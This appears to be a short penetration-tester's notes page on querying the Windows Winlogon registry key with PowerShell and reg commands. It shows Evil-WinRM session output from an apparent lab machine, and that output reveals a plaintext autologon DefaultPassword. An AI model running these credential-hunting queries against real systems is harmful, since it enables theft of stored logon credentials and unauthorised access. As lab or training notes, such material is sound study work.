# registry / regedit

### TL;DR

### PowerShell
```
ls 'HKLM:\software\microsoft\windows nt\currentversion\winlogon'

Get-ItemProperty -Path 'HKLM:\software\microsoft\windows nt\currentversion\winlogon'
gp -pa 'HKLM:\software\microsoft\windows nt\currentversion\winlogon'
```

### CMD
```
reg query 'HKLM\software\microsoft\windows nt\currentversion\winlogon'
```

### 
```

```

### 
```

```

### Examples
```

```

### 
```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ls 'HKLM:\software\microsoft\windows nt\currentversion\winlogon'


    Hive: HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon


Name                           Property
----                           --------
AlternateShells                DefaultShell : explorer.exe
GPExtensions
UserDefaults                   ExcludeProfileDirs : AppData\Local;AppData\LocalLow;$Recycle.Bin;OneDrive;Work Folders
AutoLogonChecked
VolatileUserMgrKey
```

### 
```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> Get-ItemProperty -Path 'HKLM:\software\microsoft\windows nt\currentversion\winlogon'


AutoRestartShell             : 1
Background                   : 0 0 0
CachedLogonsCount            : 10
DebugServerCommand           : no
DefaultDomainName            : EGOTISTICALBANK
DefaultUserName              : EGOTISTICALBANK\svc_loanmanager
DisableBackButton            : 1
EnableSIHostIntegration      : 1
ForceUnlockLogon             : 0
LegalNoticeCaption           :
LegalNoticeText              :
PasswordExpiryWarning        : 5
PowerdownAfterShutdown       : 0
PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
ReportBootOk                 : 1
Shell                        : explorer.exe
ShellCritical                : 0
ShellInfrastructure          : sihost.exe
SiHostCritical               : 0
SiHostReadyTimeOut           : 0
SiHostRestartCountLimit      : 0
SiHostRestartTimeGap         : 0
Userinit                     : C:\Windows\system32\userinit.exe,
VMApplet                     : SystemPropertiesPerformance.exe /pagefile
WinStationsDisabled          : 0
scremoveoption               : 0
DisableCAD                   : 1
LastLogOffEndTimePerfCounter : 5742365237
ShutdownFlags                : 19
DisableLockWorkstation       : 0
DefaultPassword              : Moneymakestheworldgoround!
PSPath                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon
PSParentPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion
PSChildName                  : winlogon
PSDrive                      : HKLM
PSProvider                   : Microsoft.PowerShell.Core\Registry



*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
```

### 
```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> reg query 'HKLM\software\microsoft\windows nt\currentversion\winlogon'

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x156458a35
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\AlternateShells
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\GPExtensions
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\UserDefaults
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\VolatileUserMgrKey
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
```

### 
```

```

### 
```

```
